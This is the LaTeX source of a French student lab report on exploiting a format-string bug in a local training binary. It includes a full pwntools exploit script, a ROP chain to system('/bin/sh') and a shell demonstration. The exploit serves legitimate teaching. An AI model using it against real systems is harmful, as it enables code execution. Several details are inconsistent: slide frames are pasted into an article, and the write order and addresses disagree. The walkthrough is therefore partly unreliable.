\documentclass[11pt,a4paper]{article}

% --- Encodage et Langue ---
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[french]{babel}

% --- Mise en page et Graphismes ---
\usepackage{geometry}
\geometry{hmargin=2.5cm, vmargin=2.5cm}
\usepackage{graphicx}
\usepackage{float}
\usepackage{eso-pic}     % Pour le logo en haut à droite
\usepackage{parskip}    % Espace automatique entre les paragraphes
\usepackage{microtype}  % Améliore la typographie

% --- Listes et Liens ---
\usepackage{enumitem}   % Pour l'espacement des listes
\setlist[itemize]{itemsep=4pt, topsep=4pt}
\usepackage[hidelinks]{hyperref}

% --- Math ---
\usepackage{amsmath}

% --- Code et Coloration ---
\usepackage{listings}
\usepackage{xcolor}

% --- Palette de couleurs "Modern Coding" ---
\definecolor{codebg}{rgb}{0.98, 0.98, 1.0}
\definecolor{keywordblue}{HTML}{005CC5}    % Commandes
\definecolor{parameterorange}{HTML}{E36209} % Options (-)
\definecolor{stringgreen}{HTML}{22863A}    % Chemins et textes
\definecolor{commentgray}{HTML}{6A737D}    % Commentaires
\definecolor{bordergray}{HTML}{E1E4E8}     % Bordures

% --- Configuration de listings (Coloré + Numéroté) ---
\lstset{
    backgroundcolor=\color{codebg},
    basicstyle=\ttfamily\small\color{black},
    breaklines=true,
    columns=fullflexible,
    showstringspaces=false,
    % Numérotation
    numbers=left,
    numberstyle=\tiny\color{commentgray},
    stepnumber=1,
    numbersep=10pt,
    % Bordures et Marges
    frame=single,
    frameround=tttt,
    rulecolor=\color{bordergray},
    framesep=6pt,
    xleftmargin=20pt,
    % Styles
    keywordstyle=\color{keywordblue}\bfseries,
    commentstyle=\color{commentgray}\itshape,
    stringstyle=\color{stringgreen},
    % Mots-clés OpenSSL
    morekeywords={openssl, genpkey, genrsa, req, x509, ca, pkcs12, s_client, s_server},
    % Paramètres et options
    literate={-}{{\textcolor{parameterorange}{-}}}1
             {=}{{\textcolor{keywordblue}{=}}}1,
    emph={algorithm, pkeyopt, out, key, days, subj, config, extensions, in, export, inkey, certfile, name, connect, CAfile},
    emphstyle=\color{parameterorange}
}

% --- Commande perso pour le code en ligne ---
\newcommand{\code}[1]{\texttt{\small\colorbox{codebg}{\textcolor{black}{#1}}}}

% --- Informations du document ---
\title{
    \vspace{1.5cm}
    \Huge \textbf{Exploitation des chaînes de format (Format String)}\\[1ex]
    \large CSC\_4CS03\_TP - Cyberattaques : menaces et mises en œuvre}
\author{\textbf{Thomas Cadegros, Yahya Moustahsane}}
\date{Février 2026}

\begin{document}

% --- Logo ---
\AddToShipoutPicture*{
    \put(450,700){\includegraphics[height=3.5cm]{src/image/logo_tp.png}}
}

\maketitle
\vspace{1cm}

\tableofcontents

\vspace{1cm}
\begin{center}
    \rule{0.5\linewidth}{0.5pt} \\
    \vspace{0.3cm}
    \small \textbf{Code Source et Ressources} \\
    Les fichiers, les scripts utilisés lors de ce TP sont disponibles sur le dépôt GitHub suivant : \\
    \href{https://github.com/thomas-cad/format-string-attack}{\texttt{https://github.com/thomas-cad/format-string-attack}} \\
    \rule{0.5\linewidth}{0.5pt}
\end{center}
\vspace{1cm}

\section{Analyse préliminaire du programme}

\subsection{Test de détection de la vulnérabilité}

Pour identifier la faille et localiser notre buffer d'entrée sur la pile, nous avons exécuté le programme en fournissant une chaîne contenant un motif reconnaissable (AAAA) suivi d'une demande d'accès direct à un index éloigné sur la pile, correspondant à notre analyse dynamique.

Nous avons utilisé le payload suivant : \code{AAAA \%16\$p}.
\begin{itemize}
    \item \code{AAAA} : Motif reconnaissable (0x41414141) pour repérer notre buffer sur la pile.
    \item \code{\%16\$p} : Demande d'afficher directement la 16\ieme{} valeur sur la pile.
\end{itemize}

Voici le résultat de l'exécution dans notre environnement de test :

\begin{lstlisting}[caption={Test d'injection confirmant l'offset}, language=bash]
thomas@zephyrus:~/work/devoir2026$ ./vuln
Checking ping is on the system...
/usr/bin/ping
Please Insert an IP address to ping:
AAAA %16$p
AAAA 0x41414141
ping: AAAA: Name or service not known
\end{lstlisting}

\subsection{Interprétation des résultats}

L'analyse de la sortie confirme la présence de la vulnérabilité :

\begin{enumerate}
    \item \textbf{Interprétation des formats :} Le programme n'a pas affiché la chaîne littérale \texttt{"\%p \%p..."}. À la place, il a affiché des valeurs hexadécimales (\texttt{0x5acad81676b1}, \texttt{0xfbad2288}, etc.).
    \item \textbf{Fuite de mémoire (Exfiltration) :} Ces valeurs hexadécimales correspondent au contenu de la pile (Stack) au moment de l'appel à la fonction d'affichage.
\end{enumerate}

\subsection{Nature exacte de la vulnérabilité}

La vulnérabilité détectée est une \textbf{Format String Vulnerability}

\paragraph{Justification théorique :}
En langage C, les fonctions d'affichage formaté comme \texttt{printf} attendent une chaîne de format suivie d'arguments optionnels. Une implémentation sécurisée devrait être :
\begin{lstlisting}[language=C]
printf("%s", user_input);
\end{lstlisting}
Ici, le comportement observé indique que l'entrée utilisateur est passée directement comme premier argument (chaîne de format) :
\begin{lstlisting}[language=C]
printf(user_input);
\end{lstlisting}

\subsection{Capacités offertes par la vulnérabilité}

Cette vulnérabilité offre deux vecteurs d'attaque principaux nécessaires pour la suite de l'exploitation :

\begin{itemize}
    \item \textbf{Exfiltration de données (Lecture) :} Comme démontré par notre test, l'utilisation de \texttt{\%p} (ou \texttt{\%x}, \texttt{\%s}) permet de lire le contenu de la pile. Cela nous permettra de contourner les protections comme l'ASLR/PIE en récupérant des adresses mémoires valides (adresses de retour, pointeurs de pile, adresse de base de la libc).
    
    \item \textbf{Modification de la mémoire (Écriture) :} Bien que non visible dans la sortie standard, la nature de la faille \textit{Format String} permet l'utilisation du spécificateur \texttt{\%n} (et ses variantes \texttt{\%hn}, \texttt{\%hhn}). Ce spécificateur est particulier car il n'affiche rien mais \textbf{écrit} le nombre de caractères affichés jusqu'à présent dans l'adresse pointée par l'argument correspondant sur la pile. C'est ce mécanisme qui permettra d'écraser l'adresse de retour (Saved RIP) pour rediriger le flux d'exécution vers notre chaîne ROP.
\end{itemize}

\vspace{0.5cm}
\textbf{Conclusion :} Le programme est vulnérable. Nous pouvons lire la pile pour calculer les offsets nécessaires et nous pouvons écrire en mémoire pour détourner le flux d'exécution.
\section{Extraction d'informations via GDB}

% --- Slide 1 : Session GDB ---
\begin{frame}[fragile]{Session de débogage}
    \textbf{Injection :} \code{AAAAAAAA \%7\$p \%27\$p} pour inspecter la pile

    \begin{lstlisting}[language=bash]
(gdb) run
Please Insert an IP address to ping:
AAAAAAAA %7$p %27$p
AAAAAAAA 0x7fffffffdc38 0x5555555554f3
    \end{lstlisting}

    \vspace{0.3cm}
    \textbf{Rappel convention x86\_64 :}
    \begin{itemize}
        \item 6 premiers arguments dans les registres (RDI, RSI, RDX, RCX, R8, R9)
        \item \code{\%7\$p} = premier mot sur la pile (au-delà des registres)
    \end{itemize}
\end{frame}

% --- Slide 2 : Analyse des mots exfiltrés ---
\begin{frame}{Analyse des données exfiltrées}
    \begin{columns}[T]
        \begin{column}{0.48\textwidth}
            \textbf{Mot n\textsuperscript{o}7 : \texttt{0x7fff...dc38}}
            \begin{itemize}
                \item Adresse de la \textbf{pile} (stack)
                \item Pointeur vers une variable locale ou le buffer
                \item Cible d'écriture avec \code{\%7\$n}
            \end{itemize}
        \end{column}
        \begin{column}{0.48\textwidth}
            \textbf{Mot n\textsuperscript{o}27 : \texttt{0x5555...54f3}}
            \begin{itemize}
                \item Adresse du segment \textbf{.text} (PIE)
                \item = \textbf{Saved RIP} (adresse de retour)
                \item Preuve : $\texttt{0x54f3} - 5 = \texttt{0x54ee}$ (instruction \texttt{call})
            \end{itemize}
        \end{column}
    \end{columns}
\end{frame}

% --- Slide 3 : Stack mapping ---
\begin{frame}{Cartographie de la pile}
    \begin{table}
        \centering
        \small
        \begin{tabular}{|c|c|l|}
            \hline
            \textbf{Offset} & \textbf{Contenu} & \textbf{Description} \\
            \hline
            \code{\%7\$p}  & \texttt{0x7fff...dc38} & Sommet de pile (RSP) \\
            \hline
            \code{\%8\$p} -- \code{\%26\$p} & \dots & Variables locales + padding \\
            \hline
            \textbf{\code{\%27\$p}} & \texttt{0x5555...54f3} & \textbf{Saved RIP} (retour vers main) \\
            \hline
            \code{\%28\$p} & \dots & Zone stable (stockage "/bin/sh") \\
            \hline
        \end{tabular}
    \end{table}

    \vspace{0.3cm}
    \textbf{Conclusion :} distance Saved RIP -- sommet pile = $20 \times 8 = 160$ octets
\end{frame}

\section{Calcul des distances nécessaires à la chaîne ROP}

Pour contourner la protection PIE (\textit{Position Independent Executable}), les adresses absolues ne sont pas fiables. Nous devons calculer les \textbf{distances relatives} (offsets) entre notre point de détournement (l'adresse de retour sur la pile) et nos cibles.

\subsection{Identification des adresses clés via GDB}

À l'aide du débogueur, nous avons extrait les adresses suivantes lors d'une session d'exécution unique :

\begin{itemize}
    \item \textbf{Adresse de référence ($Ref$)} : Il s'agit de l'adresse de retour sauvegardée sur la pile par la fonction \texttt{makePing}. Dans le désassemblage de \texttt{main}, c'est l'instruction suivant immédiatement l'appel :
    \begin{lstlisting}[language=bash, basicstyle=\footnotesize\ttfamily]
0x00005555555554ee <+24>:    call   0x5555555553b3 <makePing>
0x00005555555554f3 <+29>:    mov    $0x0,%eax  <-- ADRESSE REF
    \end{lstlisting}
    
    \item \textbf{Adresse de System ($System$)} : L'entrée de la fonction dans la PLT.
    \item \textbf{Adresse du Gadget ($Gadget$)} : Nous avons identifié un "Universal Gadget" dans la fonction \texttt{\_\_libc\_csu\_init}.
\end{itemize}

\subsubsection{Analyse du Gadget "POP RDI" dans \texttt{\_\_libc\_csu\_init}}

L'instruction explicite \texttt{pop rdi} n'est pas présente. Cependant, l'instruction \texttt{pop r15} située à la fin de la fonction d'initialisation permet de la simuler.

\begin{lstlisting}[language=bash, caption={Désassemblage partiel de \_\_libc\_csu\_init}]
0x0000555555555562 <+98>:    pop    %r15
0x0000555555555564 <+100>:   ret
\end{lstlisting}

En code machine, \texttt{pop r15} est encodé par \code{41 5f}. L'instruction \texttt{pop rdi} correspond à l'opcode \code{5f}. En sautant le premier octet (offset +1), le processeur exécute \code{5f} (pop rdi) suivi de \code{c3} (ret).

\[ Adresse_{Gadget} = 0x555555555562 + 1 = \textbf{0x555555555563} \]

\subsection{Tableau récapitulatif des adresses}

\begin{table}[H]
    \centering
    \begin{tabular}{|l|l|c|}
        \hline
        \textbf{Élément} & \textbf{Description} & \textbf{Adresse (Hex)} \\
        \hline
        Référence ($Ref$) & Adresse de retour (dans main) & \texttt{0x5555555554f3} \\ 
        \hline
        Cible 1 ($Gadget$) & \texttt{pop rdi ; ret} (csu\_init) & \texttt{0x555555555563} \\ 
        \hline
        Cible 2 ($System$) & \texttt{system@plt} & \texttt{0x555555555100} \\ 
        \hline
    \end{tabular}
    \caption{Adresses relevées sous GDB}
\end{table}

\subsection{Calcul des Distances ($\Delta$)}

Nous calculons la distance $\Delta$ à appliquer à l'adresse de retour ($Ref$) pour atteindre les cibles.

\subsubsection{Distance vers le Gadget (POP RDI)}
\[ \Delta_{Gadget} = Gadget - Ref \]
\[ \Delta_{Gadget} = 0x555555555563 - 0x5555555554f3 = \textbf{+0x70} \]

\textbf{Interprétation :} Le gadget se trouve exactement 112 octets (0x70) après l'adresse de retour. 
Cette distance est très faible ($< 256$). Cela confirme qu'il est possible d'atteindre ce gadget en modifiant uniquement l'\textbf{octet de poids faible (LSB)} de l'adresse de retour (remplacement de \code{0xf3} par \code{0x63} et ajustement éventuel du nibble précédent), validant la stratégie de l'attaque sans connaître l'adresse de base complète (ASLR).

\subsubsection{Distance vers System}
\[ \Delta_{System} = System - Ref \]
\[ \Delta_{System} = 0x555555555100 - 0x5555555554f3 = \textbf{-0x3F3} \]

\textbf{Interprétation :} La fonction \texttt{system} se situe 1011 octets avant l'adresse de retour. Ce décalage constant sera utilisé dans le script d'exploitation pour calculer l'adresse réelle de \texttt{system} à partir de la fuite d'adresse (leak).
\section{Préparation de la charge utile (Payload)}

L'exploitation repose sur la construction d'une chaîne ROP (Return-Oriented Programming) directement sur la pile. Puisque nous exploitons une vulnérabilité de format string avec une taille de buffer limitée, nous ne pouvons pas écrire toute la chaîne en une seule fois.

Nous utilisons la boucle d'exploitation (créée en modifiant le LSB du Saved RIP à l'adresse \texttt{RBP+8}) pour écrire la chaîne ROP élément par élément dans les adresses supérieures.

\subsection{Placement des données}

Pour obtenir un shell, nous devons appeler la fonction \texttt{system("/bin/sh")}.
Selon la convention d'appel x86\_64, le premier argument doit être placé dans le registre \texttt{RDI}. Le registre \texttt{RDI} devra donc contenir \textbf{l'adresse mémoire} (pointeur) vers la chaîne \texttt{"/bin/sh"}.

\textbf{Zone de stockage de la chaîne :}
Nous choisissons de stocker la chaîne \texttt{"/bin/sh"} à l'adresse \texttt{RBP + 40}.
Cet emplacement est suffisamment éloigné pour ne pas interférer avec l'exécution du Gadget et de System.

\textbf{Encodage Little Endian :}
La chaîne \texttt{/bin/sh\textbackslash0} est convertie en entier 64 bits inversé : \textbf{\texttt{0x0068732f6e69622f}}.

\subsection{Stratégie d'insertion et Structure ROP}

La chaîne ROP finale est construite à partir de l'offset \texttt{RBP + 16}, juste après l'adresse de retour utilisée pour la boucle.

\begin{table}[H]
    \centering
    \begin{tabular}{|c|c|l|l|}
        \hline
        \textbf{Offset Pile} & \textbf{Adresse Python} & \textbf{Contenu} & \textbf{Rôle} \\
        \hline
        \texttt{RBP + 8} & \texttt{addr\_rip} & \texttt{...EE} & Maintien de la boucle \\
        \hline
        \texttt{RBP + 16} & \texttt{addr\_rbp + 16} & \texttt{Gadget POP RDI} & Charge RDI avec la valeur suivante \\
        \hline
        \texttt{RBP + 24} & \texttt{addr\_rbp + 24} & \texttt{Adresse Chaîne} & Argument (Pointeur vers RBP+40) \\
        \hline
        \texttt{RBP + 32} & \texttt{addr\_rbp + 32} & \texttt{Adresse System} & Appel de \texttt{system()} \\
        \hline
        \texttt{RBP + 40} & \texttt{addr\_rbp + 40} & \texttt{/bin/sh...} & Données brutes \\
        \hline
    \end{tabular}
    \caption{Organisation de la ROP Chain en mémoire}
\end{table}

\textbf{Justification de l'ordre d'écriture :}
Le script Python itère sur ce dictionnaire et écrit chaque élément (découpé en blocs de 32 bits) tout en réécrivant systématiquement \texttt{0xEE} à l'adresse \texttt{addr\_rip} pour maintenir le programme en vie.

Une fois tous les éléments en place (Gadget, Pointeur, System, Chaîne), la dernière étape consiste à écraser le Saved RIP (\texttt{addr\_rip}) non plus avec \texttt{0xEE}, mais avec l'adresse d'un petit gadget \texttt{RET} (\texttt{addr\_ret}).
Cela aura pour effet de "glisser" vers l'instruction suivante sur la pile (\texttt{RBP + 16}), déclenchant ainsi notre chaîne ROP.
\section{Construction de la boucle d'exploitation}

L'exploitation complète nécessite l'écriture de trois éléments distincts sur la pile (Gadget, Argument, Fonction System). Cependant, le buffer d'entrée est trop petit pour injecter la chaîne de format nécessaire à ces trois écritures simultanées.

Pour contourner cette limitation, nous mettons en place une \textbf{boucle d'exploitation}. Cette technique consiste à forcer le programme à ré-exécuter la fonction vulnérable \texttt{makePing} indéfiniment tant que notre charge utile n'est pas complète.

\subsection{Mécanisme de réinvocation (LSB Overwrite)}

Normalement, à la fin de la fonction \texttt{makePing}, l'instruction \texttt{ret} récupère l'adresse de retour (Saved RIP) sur la pile pour revenir à la fonction \texttt{main} et continuer l'exécution (instruction \texttt{mov \$0x0, \%eax}).

Pour relancer \texttt{makePing}, nous devons modifier cette adresse de retour pour qu'elle pointe non pas vers l'instruction suivante, mais vers l'instruction d'appel (\texttt{call}) précédente.

\subsubsection{Analyse des adresses dans le \texttt{main}}

D'après notre analyse GDB précédente (Partie 3), voici le désassemblage autour de l'appel :

\begin{lstlisting}[language=bash, basicstyle=\footnotesize\ttfamily, caption={Adresses autour de l'appel makePing}]
0x00005555555554ee <+24>:    call   0x5555555553b3 <makePing>
0x00005555555554f3 <+29>:    mov    $0x0,%eax  <-- Saved RIP actuel
\end{lstlisting}

\begin{itemize}
    \item \textbf{Adresse actuelle sur la pile :} \texttt{...54\textbf{f3}} (Retour normal).
    \item \textbf{Adresse cible pour boucler :} \texttt{...54\textbf{ee}} (Instruction \texttt{call makePing}).
\end{itemize}

Nous constatons que seule la fin de l'adresse change. La distance est de 5 octets ($0xF3 - 0xEE = 5$).

\subsection{Justification de la technique "Partial Overwrite"}

Pourquoi ne modifier que le dernier octet (LSB) ?

\begin{enumerate}
    \item \textbf{Contournement de PIE/ASLR :} Comme le programme est compilé en mode PIE (\textit{Position Independent Executable}), les adresses complètes (ex: \texttt{0x5555...}) changent à chaque exécution. Cependant, les pages mémoire étant alignées sur 4 Ko (0x1000), les 12 bits de poids faible (les 3 derniers chiffres hexadécimaux) restent constants relativement au début de la page.
    \item \textbf{Stabilité :} L'octet de poids faible de l'instruction \texttt{call} sera toujours \texttt{0xee}, quelle que soit l'adresse de base choisie par le système.
    \item \textbf{Mise en œuvre :} En utilisant le spécificateur de format \texttt{\%hhn}, nous pouvons écraser uniquement le dernier octet de l'adresse de retour sans toucher aux octets supérieurs randomisés qui restent valides.
\end{enumerate}

\subsection{Algorithme de la boucle d'attaque}

La stratégie consiste à envoyer plusieurs payloads successifs. À chaque itération (sauf la dernière), nous restaurons la boucle.

\begin{enumerate}
    \item \textbf{Itération 1 (Préparation System) :}
    \begin{itemize}
        \item Écrire l'adresse de \texttt{system} plus haut sur la pile (Offset RIP+16).
        \item Écraser le LSB du Saved RIP (actuellement \texttt{0xf3}) avec \texttt{\textbf{0xee}}.
        \item \textbf{Résultat :} Au \texttt{ret}, le programme saute sur \texttt{call makePing}. La fonction redémarre.
    \end{itemize}

    \item \textbf{Itération 2 (Préparation "/bin/sh") :}
    \begin{itemize}
        \item Écrire l'adresse de la chaîne \texttt{"/bin/sh"} sur la pile (Offset RIP+8).
        \item Écraser à nouveau le LSB du Saved RIP avec \texttt{\textbf{0xee}}.
        \item \textbf{Résultat :} La fonction redémarre encore une fois.
    \end{itemize}

    \item \textbf{Itération 3 (Déclenchement ROP) :}
    \begin{itemize}
        \item Cette fois, nous n'écrivons pas \texttt{0xee}.
        \item Nous écrasons le Saved RIP entier (ou son LSB et le suivant) par l'adresse du gadget \texttt{pop rdi ; ret} (dont le LSB est \texttt{0x63}).
        \item \textbf{Résultat :} Au \texttt{ret}, le programme saute sur le gadget. RDI est chargé avec l'argument, puis \texttt{system} est appelé.
    \end{itemize}
\end{enumerate}
\section{Déclenchement final et obtention du shell}

% --- Slide 1 : Gadget RET intermédiaire ---
\begin{frame}[fragile]{Gadget RET intermédiaire}
    \textbf{Pourquoi ne pas sauter directement sur \texttt{pop rdi ; ret} ?}

    \vspace{0.3cm}
    \begin{enumerate}
        \item \textbf{Alignement pile :} x86\_64 exige un alignement 16 octets pour certaines fonctions GLIBC
        \item \textbf{Glissement :} le gadget \texttt{ret} dépile la valeur suivante $\rightarrow$ tombe sur notre ROP chain
    \end{enumerate}

    \vspace{0.3cm}
    \textbf{LSB Overwrite} (même technique que la boucle) :
    \begin{itemize}
        \item Saved RIP actuel : \code{0x...14\textbf{f3}}
        \item Gadget RET cible : \code{0x...14\textbf{f9}}
        \item[$\rightarrow$] Écraser 1 octet : \texttt{0xf3} $\rightarrow$ \texttt{0xf9}
    \end{itemize}

    \begin{lstlisting}[language=Python]
payload = f"%{addr_ret_lsb}c%7$hhn"   # addr_ret_lsb = 0xf9 = 249
    \end{lstlisting}
\end{frame}

% --- Slide 2 : Séquence d'exécution ---
\begin{frame}{Séquence d'exécution finale}
    \begin{enumerate}
        \item LSB du Saved RIP : \texttt{0xf3} $\rightarrow$ \texttt{0xf9}
        \item \texttt{ret} de \texttt{makePing} $\rightarrow$ saute sur le gadget \texttt{ret} du \texttt{main}
        \item Gadget \texttt{ret} $\rightarrow$ dépile l'adresse de \texttt{pop rdi ; ret}
        \item \texttt{pop rdi} $\rightarrow$ charge l'adresse de \texttt{"/bin/sh"} dans RDI
        \item \texttt{ret} $\rightarrow$ saute sur \texttt{system()}
        \item[$\Rightarrow$] \textbf{Shell interactif obtenu}
    \end{enumerate}
\end{frame}

% --- Slide 3 : Démonstration ---
\begin{frame}[fragile]{Démonstration}
    \begin{lstlisting}[language=bash]
[*] === Etape 3 : Ecriture de la chaine ROP ===
[*] Ecriture de 0x5f51 a l'adresse 0x7ffc71bc57e4
[*] Ecriture de 0x6e69622f a l'adresse 0x7ffc71bc57e8
[*] Ecriture de 0x68732f a l'adresse 0x7ffc71bc57ec
[*] Payload envoye (Valeur cible: 0xf9)
[*] Switching to interactive mode

ping: %249c%7: Name or service not known
$ echo "Hello World !"
Hello World !
$ echo "TP termine"
TP termine
    \end{lstlisting}

    \begin{center}
        \textbf{Exploitation réussie -- accès shell confirmé.}
    \end{center}
\end{frame}

\section{Script d'exploitation}

% --- Slide 1 : Configuration et Leak ---
\begin{frame}[fragile]{Script -- Configuration et leak des adresses}
    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
from pwn import *
import re

prog = "./vuln"
context.arch = 'amd64'
p = process(prog)

# Offsets
OFFSET_BUFFER = 16
DIST_BUFFER_RBP = 80
DIST_SAVEDRBP_RBP = 0x20
DIST_SAVEDRIP_GADGET = -0x70
DIST_SAVEDRIP_SYSTEM = 0x3F3
DIST_SAVEDRIP_RET = -0x6

# === Etape 1 : Leak des adresses ===
p.recvuntil(b"address to ping:")
payload = "%26$16p | %27$16p%203c%7$hhn"
p.sendline(payload.encode())

raw_response = p.recvuntil(b"ping").decode(errors='ignore')
leaks = re.findall(r"(0x[0-9a-fA-F]+)", raw_response)
saved_rbp = int(leaks[0], 16)
saved_rip = int(leaks[1], 16)
    \end{lstlisting}

    \begin{itemize}
        \item Leak de \texttt{Saved RBP} (offset 26) et \texttt{Saved RIP} (offset 27)
        \item Simultanément : écriture de \texttt{0xEE} sur le LSB pour maintenir la boucle
    \end{itemize}
\end{frame}

% --- Slide 2 : Calcul des adresses et ROP chain ---
\begin{frame}[fragile]{Script -- Calcul des adresses et ROP chain}
    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
# === Etape 2 : Calcul des adresses ===
addr_rbp = saved_rbp - DIST_SAVEDRBP_RBP
addr_ret = saved_rip - DIST_SAVEDRIP_RET
addr_system = saved_rip - DIST_SAVEDRIP_SYSTEM
addr_gadget = saved_rip - DIST_SAVEDRIP_GADGET
addr_str = addr_rbp + 40
addr_rip = addr_rbp + 8

# Definition de la chaine ROP
rop_chain = {
    addr_rbp + 16 : addr_gadget,         # pop rdi; ret
    addr_rbp + 24 : addr_str,            # adresse de "/bin/sh"
    addr_rbp + 32 : addr_system,         # system@plt
    addr_rbp + 40 : u64(b'/bin/sh\x00'), # chaine brute
}
    \end{lstlisting}

    \vspace{0.2cm}
    \textbf{Distances relatives} calculées depuis le Saved RIP :
    \begin{itemize}
        \item Gadget \texttt{pop rdi; ret} : \texttt{+0x70} | System : \texttt{-0x3F3} | Gadget \texttt{ret} : \texttt{+0x6}
    \end{itemize}
\end{frame}

% --- Slide 3 : Boucle d'écriture ---
\begin{frame}[fragile]{Script -- Boucle d'écriture de la ROP chain}
    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
# === Etape 3 : Ecriture de la chaine ROP ===
for addr, value in rop_chain.items():
    mask32 = (1 << 32) - 1
    writes_sequence = [
        (addr, value & mask32),
        (addr + 4, (value >> 32) & mask32),
    ]
    for target_addr, part_value in writes_sequence:
        p.recvuntil(b"Please Insert an IP address to ping: ")
        current_writes = {
            target_addr: part_value,  # Partie de la ROP chain
            addr_rip: 0xee           # Maintien de la boucle
        }
        payload = fmtstr_payload(
            offset=OFFSET_BUFFER,
            writes=current_writes,
            write_size='short'
        )
        p.sendline(payload)
    \end{lstlisting}

    \begin{itemize}
        \item Chaque valeur 64 bits est écrite en 2 blocs de 32 bits (LSB puis MSB)
        \item \texttt{0xEE} est réécrit à chaque itération pour boucler sur \texttt{makePing}
    \end{itemize}
\end{frame}

% --- Slide 4 : Déclenchement final ---
\begin{frame}[fragile]{Script -- Déclenchement final}
    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
# === Etape 4 : Trigger ===
addr_ret_lsb = addr_ret & 0xff

payload = f"%{addr_ret_lsb}c%7$hhn"
p.recvuntil("Please Insert an IP address to ping: ".encode())
p.sendline(payload.encode())

p.interactive()
    \end{lstlisting}

    \vspace{0.3cm}
    \textbf{Dernière itération :}
    \begin{itemize}
        \item On n'écrit plus \texttt{0xEE} (boucle) mais \texttt{0xF9} (gadget \texttt{ret})
        \item Le flux d'exécution glisse vers la ROP chain $\rightarrow$ \texttt{system("/bin/sh")}
        \item[$\Rightarrow$] \textbf{Shell obtenu}
    \end{itemize}
\end{frame}


\end{document}